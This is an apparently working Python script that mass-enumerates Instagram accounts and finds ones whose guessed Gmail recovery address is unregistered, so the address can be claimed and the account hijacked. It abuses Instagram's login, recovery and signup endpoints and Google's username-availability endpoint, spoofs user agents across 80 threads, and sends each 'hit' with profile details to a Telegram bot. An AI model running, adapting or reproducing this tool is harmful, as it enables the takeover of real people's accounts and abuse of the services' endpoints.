import os,requests
from requests import get
import Topython
import random
import requests
import json
import uuid
import hashlib
from fake_useragent import UserAgent
import threading
import sys
import time
import pycountry
from secrets import token_hex
from ms4 import InfoIG,RestInsta
import os
import string
from queue import Queue
try:from user_agent import generate_user_agent
except:os.system('pip install user_agent');from user_agent import generate_user_agent
from time import time
from hashlib import md5
from random import randrange,choice
import os
hit_dustu=kotu_insta=orta_mail=0
BLUE,RESET,BOLD,YELLOW,RED,GREEN,CYAN,MAGENTA='\x1b[94m','\x1b[0m','\x1b[1m','\x1b[93m','\x1b[91m','\x1b[92m','\x1b[96m','\x1b[95m'
E='\x1b[1;32m'
G='\x1b[1;36m'
Z='\x1b[1;31m'
Q='\x1b[1;36m'
X='\x1b[1;33m'
Z1='\x1b[2;31m'
F='\x1b[2;32m'
A='\x1b[2;34m'
C='\x1b[2;35m'
B='\x1b[38;5;208m'
Y='\x1b[1;34m'
M='\x1b[1;37m'
S='\x1b[1;33m'
U='\x1b[1;37m'
BRed='\x1b[1;31m'
BGreen='\x1b[1;32m'
BYellow='\x1b[1;33m'
R='\x1b[1;34m'
BPurple='\x1b[1;35m'
BCyan='\x1b[1;36m'
BWhite='\x1b[1;37m'
BLUE='\x1b[94m'
RESET='\x1b[0m'
BOLD='\x1b[1m'
YELLOW='\x1b[93m'
RED='\x1b[91m'
GREEN='\x1b[92m'
CYAN='\x1b[96m'
MAGENTA='\x1b[95m'
try:from cfonts import render
except:os.system('pip install python-cfonts');from cfonts import render
token=input(f" 𝐓𝐨𝐤𝐞𝐧: ")
print('\x1b[1;39m—'*60)
ID=input(' 𝐈𝐃: ')
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
yy='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]
def tll():
	try:
		n1=''.join(cc(yy)for i in range(rr(6,9)));n2=''.join(cc(yy)for i in range(rr(3,9)));host=''.join(cc(yy)for i in range(rr(15,30)));he3={'accept':'*/*','accept-language':'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','sec-ch-ua':'"Not)A;Brand";v="24","Chromium";v="116"','sec-ch-ua-arch':'""','sec-ch-ua-bitness':'""','sec-ch-ua-full-version':'"116.0.5845.72"','sec-ch-ua-full-version-list':'"Not)A;Brand";v="24.0.0.0","Chromium";v="116.0.5845.72"','sec-ch-ua-mobile':'?1','sec-ch-ua-model':'"ANY-LX2"','sec-ch-ua-platform':'"Android"','sec-ch-ua-platform-version':'"13.0.0"','sec-ch-ua-wow64':'?0','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','x-chrome-connected':'source=Chrome,eligible_for_consistency=true','x-client-data':'CJjbygE=','x-same-domain':'1','Referrer-Policy':'strict-origin-when-cross-origin','user-agent':str(gg())};res1=requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',headers=he3);tok=re.search('data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',res1.text).group(2);cookies={'__Host-GAPS':host};headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp','user-agent':gg()};data={'f.req':'["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]','deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'};response=pp('https://accounts.google.com/_/signup/validatepersonaldetails',cookies=cookies,headers=headers,data=data);tl=str(response.text).split('",null,"')[1].split('"')[0];host=response.cookies.get_dict()['__Host-GAPS']
		try:os.remove('tl.txt')
		except:pass
		with open('tl.txt','a')as f:f.write(tl+'//'+host+'\n')
	except Exception as e:print(e);tll()
tll()
def check_gmail(email):
	if'@'in email:email=str(email).split('@')[0]
	try:
		try:o=open('tl.txt','r').read().splitlines()[0]
		except:tll();o=open('tl.txt','r').read().splitlines()[0]
		tl,host=o.split('//');cookies={'__Host-GAPS':host};headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,'user-agent':gg()};params={'TL':tl};data='continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&';response=pp('https://accounts.google.com/_/signup/usernameavailability',params=params,cookies=cookies,headers=headers,data=data)
		if'"gf.uar",1'in str(response.text):return'good'
		elif'"er",null,null,null,null,400'in str(response.text):tll();check_gmail(email)
		else:return'bad'
	except:check_gmail(email)
def rest(user):
	try:headers={'X-Pigeon-Session-Id':'50cc6861-7036-43b4-802e-fb4282799c60','X-Pigeon-Rawclienttime':'1700251574.982','X-IG-Connection-Speed':'-1kbps','X-IG-Bandwidth-Speed-KBPS':'-1.000','X-IG-Bandwidth-TotalBytes-B':'0','X-IG-Bandwidth-TotalTime-MS':'0','X-Bloks-Version-Id':'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0','X-IG-Connection-Type':'WIFI','X-IG-Capabilities':'3brTvw==','X-IG-App-ID':'567067343352427','User-Agent':'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)','Accept-Language':'en-GB,en-US','Cookie':'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP;csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','Content-Type':'application/x-www-form-urlencoded;charset=UTF-8','Accept-Encoding':'gzip,deflate','Host':'i.instagram.com','X-FB-HTTP-Engine':'Liger','Connection':'keep-alive','Content-Length':'356'};data={'signed_body':f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{user}","guid":"{user}","device_id":"{user}","query":"{user}"}}','ig_sig_key_version':'4'};response=requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).json();r=response.get('email',' h ')
	except Exception as e:r=f" h "
	return r
def x7s1eiginfo(username,jj):
	global hit_dustu
	try:
		user_data=InfoIG.Instagram_Info(username);reset_value=RestInsta.Rest(username).get('email','Nothing To Rest')
		if not user_data:return None
		cookies={'ig_did':'E50FABB9-2431-45C2-A804-50BB922F7C97','csrftoken':'Gs5qTLrfajMdt0_4klliKd','datr':'B5_XZ1qXyHIoAhibTD6smK7K'};headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','referer':f"https://www.instagram.com/{username}/",'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-ig-app-id':'936619743392459','x-requested-with':'XMLHttpRequest'};params={'username':username};response=requests.get('https://www.instagram.com/api/v1/users/web_profile_info/',params=params,cookies=cookies,headers=headers)
		try:is_business=response.json()['data']['user']['is_business_account']
		except:is_business=False
		followers=user_data.get('Followers',0)
		try:
			user_id=int(user_data.get('ID','0'))if str(user_data.get('ID','0')).isdigit()else 0
			if 1<=user_id<1279000:account_year='2010'
			elif 1279001<=user_id<17750000:account_year='2011'
			elif 17750001<=user_id<279760000:account_year='2012'
			elif 279760001<=user_id<900990000:account_year='2013'
			elif 900990001<=user_id<1629010000:account_year='2014'
			elif 1900000000<=user_id<2500000000:account_year='2015'
			elif 2500000000<=user_id<3713668786:account_year='2016'
			elif 3713668786<=user_id<5699785217:account_year='2017'
			elif 5699785217<=user_id<8507940634:account_year='2018'
			elif 8507940634<=user_id<21254029834:account_year='2019'
			else:account_year='2020-2023'
		except:account_year='Unknown'
		if is_business or followers>100:send_to_x7s1e_only=True;header='True'
		else:send_to_x7s1e_only=False;header='False';hit_dustu+=1
		hit_data=f"""Fhck never disappoints you

⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘

𝗠𝗘𝗧𝗔 : {header}
𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : {username}
𝗘𝗠𝗔𝗜𝗟 : {username}@gmail.com
𝗥𝗘𝗦𝗘𝗧 : {reset_value}  
𝗡𝗔𝗠𝗘 : {user_data.get("Name","N/A")}
𝗜𝗗 : {user_data.get("ID","N/A")}
𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦 : {followers}
𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚 : {user_data.get("Following",0)}
𝗕𝗜𝗢 : {user_data.get("Bio","N/A")}
𝗬𝗘𝗔𝗥 : {account_year}
𝗣𝗢𝗦𝗧𝗦 : {user_data.get("Posts",0)}
𝗣𝗥𝗜𝗩𝗔𝗧𝗘 : {user_data.get("Is Private",False)}
𝗟𝗜𝗡𝗞 : https://www.instagram.com/{username}

⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘

𝗕𝗬 : @mmhhn 𝗖𝗛 : @mmmhn
"""
		try:
			with open('Fhck.txt','a',encoding='utf-8')as file:file.write(hit_data+'\n\n')
		except:pass
		inline_keyboard=[[{'text':'𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥','url':'https://t.me/mmhhn'},{'text':'𝗖𝗛𝗔𝗡𝗡𝗘𝗟','url':'https://t.me/mmmhn'}]];data={'text':hit_data,'reply_markup':json.dumps({'inline_keyboard':inline_keyboard})};data['chat_id']=ID;requests.get(f"https://api.telegram.org/bot{token}/sendMessage",params=data)
	except:pass
def x7s1e(email):
	global orta_mail
	try:
		if'good'==check_gmail(email):username,jj=email.split('@');x7s1eiginfo(username,jj)
		else:orta_mail+=1
	except:''
def x7s1echeck(email):
	global kotu_insta,hit_dustu,orta_mail
	class Variable:country=[country.numeric for country in pycountry.countries];num=random.choice(country);sgin=hashlib.sha256(uuid.uuid4().hex.encode()).hexdigest();csr=str(token_hex(8))*2;android=f"android-{uuid.uuid4().hex[:16]}"
	variable_instance=Variable()
	def x7s1e_user_agent():ii=['165.1.0.29.119','166.0.0.30.120','167.0.0.31.121','168.0.0.32.122'];aa={'28/9':['720dpi','1080dpi','1440dpi'],'29/10':['720dpi','1080dpi','1440dpi','2160dpi'],'30/11':['1080dpi','1440dpi','2160dpi'],'31/12':['1440dpi','2160dpi']};ss={'720dpi':['1280x720','1920x1080'],'1080dpi':['1920x1080','2560x1440','3840x2160'],'1440dpi':['2560x1440','3840x2160'],'2160dpi':['3840x2160','7680x4320']};dd={'samsung':['SM-T292','SM-G973F','SM-A515F'],'google':['Pixel 4','Pixel 5'],'huawei':['P30 Pro','Mate 40 Pro'],'xiaomi':['Mi 10','Redmi Note 10'],'oneplus':['8T','9 Pro'],'sony':['XZ2','Xperia 1']};cc=['qcom','exynos','kirin','mediatek','apple'];lan=['en_US','es_ES','fr_FR','de_DE','zh_CN','ja_JP','ko_KR'];dp=['phone','tablet','watch','tv','car'];arm=['arm64_v8a','armeabi-v7a','x86','x86_64'];comb=['samsung','google','huawei','xiaomi','oneplus','sony'];sos=random.choice(list(aa.keys()));vlo=random.choice(aa[sos]);lop=random.choice(ss[vlo]);ki=random.choice(comb);mo=random.choice(dd.get(ki,['Unknown']));user_agent=f"Instagram {random.choice(ii)} Android ({sos}; {vlo}; {lop}; {ki}; {mo}; {random.choice(arm)}; {random.choice(dp)}; {random.choice(lan)}; {random.choice(cc)})";return user_agent
	try:
		method=random.choice([1,2,3,4])
		if method==1:
			csrftoken=md5(str(time()).encode()).hexdigest();headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded','origin':'https://www.instagram.com','referer':'https://www.instagram.com/accounts/signup/email/','user-agent':generate_user_agent(),'x-csrftoken':csrftoken};data={'email':email};response=requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/',headers=headers,data=data)
			if'email_is_taken'in str(response.text):x7s1e(email)
			else:kotu_insta+=1
		elif method==2:
			ua=generate_user_agent();csrftoken=md5(str(time()).encode()).hexdigest();device_id='android-'+hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16];uui=str(uuid.uuid4());headers={'User-Agent':ua,'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'};cookies={'csrftoken':csrftoken};data={'signed_body':'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'+json.dumps({'_csrftoken':csrftoken,'adid':uui,'guid':uui,'device_id':device_id,'query':email}),'ig_sig_key_version':'4'};response=requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,cookies=cookies,data=data).text
			if email in response:x7s1e(email)
			else:kotu_insta+=1
		elif method==3:
			responses=requests.get('https://www.instagram.com/api/graphql');mid=responses.cookies.get_dict().get('mid','Zo8bBAAEAAF27Fed1oBbtK7tGgwj');url='https://i.instagram.com/api/v1/accounts/create/';headers={'Host':'i.instagram.com','cookie':f"mid={mid}",'x-ig-capabilities':'AQ==','cookie2':'$Version=1','x-ig-connection-type':'WIFI','user-agent':'Instagram 136.0.0.34.124 Android'};data={'password':'Topython','device_id':str(uuid.uuid4()),'guid':str(uuid.uuid4()),'email':email,'username':'topython8786969_586'};response=requests.post(url,headers=headers,data=data)
			if'Another account is using the same email'in response.text:x7s1e(email)
			else:kotu_insta+=1
		elif method==4:
			csrftoken=md5(str(time()).encode()).hexdigest();ua=generate_user_agent();headers={};data={'enc_password':'#PWD_INSTAGRAM_BROWSER:0:'+str(time()).split('.')[0]+':maybe-jay-z','optIntoOneTap':'false','queryParams':'{}','trustedDeviceRecords':'{}','username':email}
			try:response=requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',headers=headers,data=data)
			except Exception as e:return e
			try:csrf=md5(str(time()).encode()).hexdigest();mid=response.cookies['mid'];ig_did=response.cookies.get('ig_did','');ig_nrcb=response.cookies.get('ig_nrcb','');app=''.join(random.choice('1234567890')for _ in range(15))
			except:csrf='Xs_pgEDyRPW7J-XbcRxAuG';mid='Z9kT-AALAAFmBDeLH2Lk_XrIJfr3';ig_did='273FE2EC-B117-427D-AA63-55AAA5079643';ig_nrcb=''
			headers={'User-Agent':generate_user_agent(),'content-type':'application/x-www-form-urlencoded;charset=UTF-8','x-csrftoken':csrf,'x-ig-app-id':app,'Cookie':f"csrftoken={csrf}; mid={mid}; ig_did={ig_did}; ig_nrcb={ig_nrcb};"}
			try:response2=requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',headers=headers,data=data)
			except:return False
			if'showAccountRecoveryModal'in response2.text:x7s1e(email)
			else:kotu_insta+=1
		elif method==5:
			url='https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.caa.ar.search.async/';payload=f"params=%7B%22client_input_params%22%3A%7B%22search_query%22%3A%22{email}%22%7D%7D";headers={'User-Agent':x7s1e_user_agent(),'x-ig-app-locale':'en-US','x-ig-device-locale':'en-US','x-ig-mapped-locale':'en-US','x-pigeon-session-id':'UFS-42175dfd-8675-4443-8f8d-7f09fa7ea9da-0','x-pigeon-rawclienttime':'1725835735.847','x-ig-bandwidth-speed-kbps':'-1.000','x-ig-bandwidth-totalbytes-b':'0','x-ig-bandwidth-totaltime-ms':'0','x-bloks-version-id':'8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb','x-ig-www-claim':'0','x-bloks-is-layout-rtl':'true','x-ig-device-id':'8745a4a2-a663-4bc7-9b3b-16d5b8ea20b9','x-ig-family-device-id':'2586e714-fdb4-4741-ba7b-0b84b13e2a97','x-ig-android-id':'android-bf1b282ab2b0b445','x-ig-timezone-offset':'10800','x-fb-connection-type':'MOBILE.LTE','x-ig-connection-type':'MOBILE(LTE)','x-ig-capabilities':'3brTv10=','x-ig-app-id':'567067343352427','priority':'u=3','accept-language':'en-US','x-mid':'Zt4loQABAAFzGR1YLL2M9XOkL9El','ig-intended-user-id':'0','content-type':'application/x-www-form-urlencoded'};response=requests.post(url,data=payload,headers=headers)
			if response.status_code==200:
				response_data=response.json()
				if'The password you entered is incorrect.'in str(response_data):x7s1e(email)
				else:kotu_insta+=1
		elif method==6:
			url='https://i.instagram.com/api/v1/users/lookup/';payload=f"signed_body={variable_instance.sgin}.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%22{variable_instance.num}%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22_csrftoken%22%3A%22{variable_instance.csr}%22%2C%22q%22%3A%22{email}%22%2C%22guid%22%3A%22{uuid.uuid4()}%22%2C%22device_id%22%3A%22{variable_instance.android}%22%2C%22directly_sign_in%22%3A%22true%22%7D&ig_sig_key_version=4";headers={'User-Agent':x7s1e_user_agent(),'Accept-Encoding':'gzip, deflate','Content-Type':'application/x-www-form-urlencoded','X-Pigeon-Session-Id':str(uuid.uuid4()),'X-Pigeon-Rawclienttime':str('{:.3f}'.format(time())),'X-IG-Connection-Speed':'-1kbps','X-IG-Bandwidth-Speed-KBPS':'-1.000','X-IG-Bandwidth-TotalBytes-B':'0','X-IG-Bandwidth-TotalTime-MS':'0','X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0','X-IG-Connection-Type':'MOBILE(LTE)','X-IG-Capabilities':'3brTvw==','X-IG-App-ID':'567067343352427','Accept-Language':'ar-YE, en-US','X-FB-HTTP-Engine':'Liger'};res=requests.post(url,data=payload,headers=headers).text
			if'"status":"ok"'in res and f"{email}"in res:x7s1e(email)
			else:kotu_insta+=1
	except:pass
	os.system('clear'if os.name=='posix'else'cls');print(f"""
 ⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘

𝗛𝗜𝗧𝗦 : {hit_dustu} 
𝗕𝗔𝗗 𝗜𝗡𝗦𝗧𝗔 :  {kotu_insta} 
𝗕𝗔𝗗 𝗘𝗠𝗔𝗜𝗟 : {orta_mail} 

⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
""")
import requests
from random import choice,randrange
from threading import Thread
from user_agent import generate_user_agent
def x7s1emain():
    while True:
        try:
            user_id = str(random.randint(100000, 21254029834))
            rnd = str(random.randint(150, 999))
            user_agent = (
                f"Instagram 311.0.0.32.118 Android ({random.choice(['23/6.0', '24/7.0', '25/7.1.1', '26/8.0', '27/8.1', '28/9.0'])}; "
                f"{random.randint(100, 1300)}dpi; {random.randint(200, 2000)}x{random.randint(200, 2000)}; "
                f"{random.choice(['SAMSUNG', 'HUAWEI', 'LGE/lge', 'HTC', 'ASUS', 'ZTE', 'ONEPLUS', 'XIAOMI', 'OPPO', 'VIVO', 'SONY', 'REALME'])}; "
                f"SM-T{rnd}; SM-T{rnd}; qcom; en_US; 545986{random.randint(111, 999)})"
            )
            lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            headers = {
                'accept': '*/*',
                'accept-language': 'en,en-US;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'dnt': '1',
                'origin': 'https://www.instagram.com',
                'priority': 'u=1, i',
                'referer': 'https://www.instagram.com/instagram/following/',
                'user-agent': user_agent,
                'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                'x-fb-lsd': lsd,
            }
            data = {
                'lsd': lsd,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                'variables': json.dumps({"userID": user_id, "username": "cristiano"}),
                'server_timestamps': 'true',
                'doc_id': '7717269488336001',
            }
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            response_json = response.json()
            user_data = response_json.get("data", {}).get("user", {})
            username = user_data.get("username", "")

            if username and "_" not in username and len(username) >= 6:
                follower_count = int(user_data.get("follower_count", 0))
                media_count = int(user_data.get("media_count", 0))
                if follower_count >= 10 and media_count > 0:
                    email = f"{username}@gmail.com"
                    x7s1echeck(email)
        except Exception:
            continue

threads = []
for _ in range(80):
    t = Thread(target=x7s1emain)
    t.start()
    threads.append(t)

for t in threads:
    t.join()
